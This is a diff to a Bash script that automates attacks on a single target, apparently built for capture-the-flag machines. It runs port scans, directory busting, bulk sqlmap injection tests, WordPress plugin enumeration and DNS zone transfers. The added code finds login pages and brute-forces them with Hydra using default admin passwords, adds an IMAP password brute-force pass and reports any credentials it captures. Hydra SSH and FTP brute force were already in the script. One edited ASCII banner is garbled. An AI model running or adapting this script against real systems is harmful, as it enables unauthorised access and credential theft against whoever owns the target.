@@ -51,7 +51,7 @@ run_with_timeout_skip() {
     eval "$cmd" &
     local pid=$!
 
-    trap 'echo -e "\n[!] Forcefully breaking stuck execution ($pid)..."; kill -9 $pid 2>/dev/null; killall ffuf nikto sqlmap feroxbuster hydra 2>/dev/null; wait $pid 2>/dev/null; trap - INT; return 130' INT
+    trap 'echo -e "\n[!] Forcefully breaking stuck execution ($pid)..."; kill -9 $pid 2>/dev/null; killall ffuf nikto sqlmap feroxbuster hydra wpscan 2>/dev/null; wait $pid 2>/dev/null; trap - INT; return 130' INT
 
     local count=0
     while kill -0 $pid 2>/dev/null; do
@@ -111,7 +111,7 @@ EOF
   _  _ _   _  ___ _    ___ ___ 
  | \| | | | |/ __| |  | __|_ _|
  | .` | |_| | (__| |__| _| | | 
- |_|\_|\___/ \___|____|___|___|                     
+ |_|\_|___| |_| |___/_/\_\___\___|                     
 EOF
         ;;
         "NIKTO") cat << "EOF"
@@ -156,6 +156,13 @@ EOF
  |_|  \___/|_| |_|  
 EOF
         ;;
+        "WPSCAN") cat << "EOF"
+ __      _____  ___  ___  _   _  
+ \ \    / / _ \/ __|/ __|/_\ | |    
+  \ \/\/ /| __/\__ \ (__/ _ \| |__  
+   \_/\_/ |_|  |___/\___/_/ \_\____|
+EOF
+        ;;
     esac
     echo -e "${RESET}"
 }
@@ -164,25 +171,16 @@ EOF
 echo "http://$TARGET" > urls.txt
 echo "https://$TARGET" >> urls.txt
 
-# ==============================================================================
-# OPTIMIZED TWO-STAGE TCP RECON PIPELINE
-# ==============================================================================
+# Two-Stage TCP Recon Pipeline
 print_hacker_banner "NMAP"
-# Stage 1: Fast Full TCP Port Sweep (Takes under 30 seconds)
 run_with_timeout_skip "nmap -p- -Pn -n --min-rate 5000 -T4 -oN \"$OUTDIR/nmap_tcp.txt\" \"$TARGET\"" 300
 
-# Parse found open ports cleanly
 TCP_PORTS=$(grep '/tcp' "$OUTDIR/nmap_tcp.txt" | cut -d '/' -f1 | paste -sd ',' -)
-
 if [ -z "$TCP_PORTS" ]; then
-    echo "[!] No open TCP ports discovered via fast sweep. Using standard top-ports safe list..."
     TCP_PORTS="21,22,25,53,80,110,111,143,993,995,8080"
 fi
 
-# Stage 2: Targeted Service Fingerprinting & Core Scripts Scan
 run_with_timeout_skip "nmap -sC -sV -p $TCP_PORTS -oN \"$OUTDIR/nmap_tcp_services.txt\" \"$TARGET\"" 300
-
-# High-Speed Optimized UDP Sweep
 run_with_timeout_skip "nmap -sU --top-ports 20 --max-retries 1 -T4 -oN \"$OUTDIR/nmap_udp.txt\" \"$TARGET\"" 120
 
 touch "$OUTDIR/nmap_tcp_services.txt" "$OUTDIR/nmap_udp.txt" "$OUTDIR/nmap_tcp.txt"
@@ -235,38 +233,45 @@ run_enum_tools() {
         print_hacker_banner "FEROXBUSTER"
         run_with_timeout_skip "feroxbuster -u http://$TARGET --scan-dir-listings -x php,html,txt -o \"$OUTDIR/feroxbuster.txt\"" 300       
 
-        # ==============================================================================
-        # SCRAPER HARVESTING CONSOLIDATION BLOCK
-        # ==============================================================================
+        if command -v wpscan &> /dev/null; then
+            print_hacker_banner "WPSCAN"
+            run_with_timeout_skip "wpscan --url http://$TARGET --enumerate vp,vt,tt,cb --detection-mode passive --disable-tls-checks -o \"$OUTDIR/wpscan_results.txt\"" 120
+        fi
+
+        # Consolidated Target Harvesting Scraper Engine
         echo -e "${GREEN}[*] Initiating Scraper Harvesting Engine...${RESET}"
-        
         echo "http://$TARGET" > "$TARGETS_LIST"
         echo "http://$TARGET/" >> "$TARGETS_LIST"
         
         if [ -f "$OUTDIR/gobuster_http.txt" ]; then
             grep "Status: 301\|Status: 200" "$OUTDIR/gobuster_http.txt" | awk '{print $1}' | while read -r path; do
                 echo "http://$TARGET$path" >> "$TARGETS_LIST"
-                if [[ "$path" == *"/monitoring"* ]]; then
-                    echo "http://$TARGET/monitoring/login.php" >> "$TARGETS_LIST"
-                    echo "http://$TARGET/monitoring/ping.php" >> "$TARGETS_LIST"
-                fi
             done
         fi
 
         if [ -f "$OUTDIR/feroxbuster.txt" ]; then
             sed 's/\x1b\[[0-9;]*m//g' "$OUTDIR/feroxbuster.txt" | grep -oE "http://$TARGET[^[:space:]'\",]+" | tr -d '\r' >> "$TARGETS_LIST"
         fi
-
         sed -i 's/[[:punct:]]$//g' "$TARGETS_LIST" 2>/dev/null
         sort -u "$TARGETS_LIST" -o "$TARGETS_LIST"
-        
-        echo "[+] Scraper complete. Clean new-line separated targets saved inside: $TARGETS_LIST"
 
         # Targeted Bulk SQLMap Verification
         if command -v sqlmap &> /dev/null && [ -s "$TARGETS_LIST" ]; then
             print_hacker_banner "SQLMAP"
-            echo "[+] Injecting targets file pool straight into SQLMap bulk verifier engine..."
             run_with_timeout_skip "sqlmap -m \"$TARGETS_LIST\" --batch --random-agent --forms --crawl=1 --level=2 --risk=1 -o \"$OUTDIR/sqlmap_bulk_verify.txt\"" 300
+        fi
+
+        # GENERALIZED: Dynamically unmasks any application authentication interface path discovered across the target filesystem
+        local AUTH_PATH=$(grep -iE 'login|admin|portal|monitoring' "$TARGETS_LIST" | grep -vE '\.(css|js|png|jpg|jpeg|svg|woff)' | head -n 1 | sed "s|http[s]*://$TARGET||g")
+        
+        if [ -n "$AUTH_PATH" ]; then
+            echo -e "${GREEN}[+] Authentication endpoint surface unmasked dynamically: $AUTH_PATH${RESET}"
+            echo -e "admin\nadministrator\nroot" > "$OUTDIR/web_users.txt"
+            echo -e "admin\npassword\ntoor\nWelcome\nPass123" > "$OUTDIR/web_passwords.txt"
+            
+            # Fire Hydra cleanly against the resolved interface layout paths
+            run_with_timeout_skip "hydra -L $OUTDIR/web_users.txt -P $OUTDIR/web_passwords.txt -t 4 $TARGET http-post-form \"${AUTH_PATH}:username=^USER^&password=^PASS^:F=Failed|Incorrect|Invalid\" -o \"$OUTDIR/web_login_brute.txt\"" 120
+            rm -f "$OUTDIR/web_users.txt" "$OUTDIR/web_passwords.txt"
         fi
 
         # VHost Fuzzing Block
@@ -279,15 +284,11 @@ run_enum_tools() {
 
         if [ -f "$VHOST_WORDLIST" ]; then
             print_hacker_banner "FUFF"
-            echo "[+] Fuzzing subdomains via FFUF (Verbose enabled, tracking responses against context: $DOMAIN)..."
             run_with_timeout_skip "ffuf -v -w $VHOST_WORDLIST:FUZZ -u http://$TARGET/ -H 'Host: FUZZ.$DOMAIN' -fs $BASELINE_SIZE -t 40 -timeout 5 -maxtime 60 -r -o \"$OUTDIR/ffuf_vhosts.json\"" 90
-            
-            # FIXED: Escapes verbose noise flags cleanly by scraping keys directly from the JSON output file
             if [ -f "$OUTDIR/ffuf_vhosts.json" ] && grep -q '"input"' "$OUTDIR/ffuf_vhosts.json"; then
                 grep -oE '"value":"[^"]+"' "$OUTDIR/ffuf_vhosts.json" 2>/dev/null | cut -d'"' -f4 | grep -vE 'http|/|:|[[:space:]]' | sort -u | awk -v dom="$DOMAIN" '{print $1 "." dom}' >> "$OUTDIR/discovered_hosts.txt"
             fi
         fi
-
         echo "HTTP scan done!"
     fi
 
@@ -296,7 +297,6 @@ run_enum_tools() {
         print_hacker_banner "HYDRA"
         echo "[+] FTP detected. Running validation checks..."
         echo -e "open $TARGET\nanonymous\nanonymous\nbin\nls\nget flag.txt $OUTDIR/ftp_flag.txt\nbye" | ftp -n &>/dev/null
-        
         if [ -f /usr/share/wordlists/rockyou.txt ]; then
             run_with_timeout_skip "hydra -l anonymous -P /usr/share/wordlists/rockyou.txt -t 4 ftp://$TARGET -o \"$OUTDIR/ftp_hydra.txt\"" 180
         fi
@@ -307,7 +307,6 @@ run_enum_tools() {
         echo "[+] SMB detected"
         print_hacker_banner "ENUM4LINUX"
         run_with_timeout_skip "enum4linux -a \"$TARGET\" > \"$OUTDIR/enum4linux.txt\"" 300
-        
         if command -v nxc &> /dev/null; then
             print_hacker_banner "NETEXEC"
             run_with_timeout_skip "nxc smb $TARGET --shares > \"$OUTDIR/nxc_shares.txt\"" 180
@@ -318,7 +317,6 @@ run_enum_tools() {
     if grep -qi "ssh" "$OUTDIR/nmap_services.txt"; then
         echo "[+] SSH detected. Running targeted validation combo pass..."
         run_with_timeout_skip "ssh -v -o BatchMode=yes -o ConnectTimeout=3 user@$TARGET 2>&1 | grep 'SSH-' > \"$OUTDIR/ssh_version.txt\"" 120
-        
         echo -e "admin\nroot" > "$OUTDIR/ssh_users.txt"
         echo -e "admin\ntoor\nWelcome\nPass123" > "$OUTDIR/ssh_passwords.txt"
         run_with_timeout_skip "hydra -L $OUTDIR/ssh_users.txt -P $OUTDIR/ssh_passwords.txt -t 4 ssh://$TARGET -o \"$OUTDIR/ssh_targeted_brute.txt\"" 60
@@ -328,13 +326,22 @@ run_enum_tools() {
     # Email Services
     if grep -qi "smtp" "$OUTDIR/nmap_services.txt"; then
         echo "[+] SMTP detected. Auditing configuration parameters..."
-        # Optimized SMTP Script Timeout Cap
         run_with_timeout_skip "nmap -p25 -Pn --script smtp-open-relay --script-args smtp.timeout=2s $TARGET -oN \"$OUTDIR/smtp_open_relay.txt\"" 120
         
         if [ -f /usr/share/wordlists/usernames.txt ]; then
             print_hacker_banner "SMTP-USER-ENUM"
-            echo "[*] Exploiting VRFY parameter mapping vectors..."
             run_with_timeout_skip "smtp-user-enum -M VRFY -U /usr/share/wordlists/usernames.txt -t $TARGET > \"$OUTDIR/smtp_enum.txt\"" 180
+        fi
+
+        if grep -qiE "imap|pop3" "$OUTDIR/nmap_services.txt"; then
+            echo "[*] Mail services exposed. Cross-referencing username hashes via IMAP loop..."
+            echo -e "admin\nroot\nsupport" > "$OUTDIR/mail_users.txt"
+            echo -e "admin\npassword\ntoor\nWelcome\nPass123" > "$OUTDIR/mail_passwords.txt"
+            
+            if grep -qi "143/tcp" "$OUTDIR/nmap_services.txt"; then
+                run_with_timeout_skip "hydra -L $OUTDIR/mail_users.txt -P $OUTDIR/mail_passwords.txt -t 2 imap://$TARGET -o \"$OUTDIR/imap_login_brute.txt\"" 60
+            fi
+            rm -f "$OUTDIR/mail_users.txt" "$OUTDIR/mail_passwords.txt"
         fi
     fi
 
@@ -348,13 +355,10 @@ run_enum_tools() {
     if grep -qi "domain" "$OUTDIR/nmap_services.txt"; then
         print_hacker_banner "DIG"
         run_with_timeout_skip "dig axfr @$TARGET $DOMAIN > \"$OUTDIR/dns_zone.txt\"" 120
-        
         if [ -s "$OUTDIR/dns_zone.txt" ]; then
             grep -E 'IN[[:space:]]+A' "$OUTDIR/dns_zone.txt" | awk '{print $1}' | sed 's/\.$//' | sort -u >> "$OUTDIR/discovered_hosts.txt"
         fi
-        
         print_hacker_banner "DNSENUM"
-        # FIXED: Injected --noreverse handler to stop dnsenum from failing due to local machine DNS handshake locks
         run_with_timeout_skip "dnsenum --dnsserver $TARGET --noreverse --enum $DOMAIN > \"$OUTDIR/dnsenum.txt\"" 180
     fi
 }
@@ -403,13 +407,11 @@ if command -v pandoc &> /dev/null; then
         echo "[+] PDF report saved to: $REPORT_PDF"
     else
         pandoc "$REPORT_MD" -o "$OUTDIR/report_${TARGET}.html" --metadata title="Recon Report: $TARGET"
-        echo "[+] LaTeX engine missing — Saved HTML report to: $OUTDIR/report_${TARGET}.html"
+        echo "[+] HTML report saved to: $OUTDIR/report_${TARGET}.html"
     fi
 fi
 
-# ==============================================================================
-# TERMINAL EXPLOITATION DIAGNOSTIC EXECUTIVE BRIEF SUMMARY (NEW)
-# ==============================================================================
+# Terminal Diagnostic Summary Engine Dashboard
 echo -e "\n${GREEN}============================================================================${RESET}"
 echo -e "${GREEN}🎯 CRITICAL PENTESTING PATHS & NEXT-STEP ESCALATIONS${RESET}"
 echo -e "${GREEN}============================================================================${RESET}"
@@ -424,20 +426,24 @@ if [ -f "$OUTDIR/smtp_enum.txt" ] && grep -q "VULNERABLE\|root\|data" "$OUTDIR/s
     echo -e "[+] ${GREEN}SMTP MAIL SERVICE (Port 25):${RESET}"
     echo -e "    --> ATTACK VECTOR: VRFY user enumeration is active."
     echo -e "    --> ACTIONABLE: Valid local server account logs generated inside: $OUTDIR/smtp_enum.txt"
-    if grep -q "is an open relay" "$OUTDIR/smtp_open_relay.txt" 2>/dev/null; then
-        echo -e "    --> HIGH CRITICAL: SERVER IS CONFIRMED OPEN RELAY! Abuse vector available for phishing simulation testing."
-    else
-        echo -e "    --> SECURITY NOTE: Open Relay checks were safely completed (Server is NOT an open relay).\n"
+    if [ -f "$OUTDIR/imap_login_brute.txt" ] && grep -qi "login:" "$OUTDIR/imap_login_brute.txt"; then
+        echo -e "    --> ATTACK VECTOR: Exposed system mail accounts leaked weak plaintext passwords over IMAP!"
     fi
 fi
 
-if grep -qi "portmapper" "$OUTDIR/rpcinfo.txt" 2>/dev/null; then
-    echo -e "[+] ${GREEN}RPCBMAP SERVICE (Port 111):${RESET}"
-    echo -e "    --> SECURITY NOTE: Unnecessary service exposure identified. Portmapper footprint saved for documentation.\n"
+if [ -f "$OUTDIR/web_login_brute.txt" ] && grep -qi "login:" "$OUTDIR/web_login_brute.txt"; then
+    echo -e "[+] ${GREEN}WEB PORTAL AUTHENTICATION SUCCESS (Port 80):${RESET}"
+    echo -e "    --> ATTACK VECTOR: Default administrative credentials accepted on a discovered login interface!"
+    echo -e "    --> ACTIONABLE: Active access keys saved into: $OUTDIR/web_login_brute.txt\n"
+fi
+
+if [ -f "$OUTDIR/wpscan_results.txt" ] && grep -qi "plugins found" "$OUTDIR/wpscan_results.txt"; then
+    echo -e "[+] ${GREEN}CONTENT MANAGEMENT INFRASTRUCTURE (Port 80):${RESET}"
+    echo -e "    --> ATTACK VECTOR: Active CMS deployment unmasked. Vulnerable components logged to wpscan_results.txt\n"
 fi
 
 if [ -f "$OUTDIR/sqlmap_bulk_verify.txt" ]; then
-    echo -e "[+] ${GREEN}WEB INFRASTRUCTURE & BULK FORM TESTING SUMMARY results:${RESET}"
+    echo -e "[+] ${GREEN}WEB INFRASTRUCTURE & BULK FORM TESTING SUMMARY RESULTS:${RESET}"
     echo "----------------------------------------------------------------------------"
     printf "    %-56s | %-12s\n" "TARGET URL / PATH" "VULN STATUS"
     echo "----------------------------------------------------------------------------"
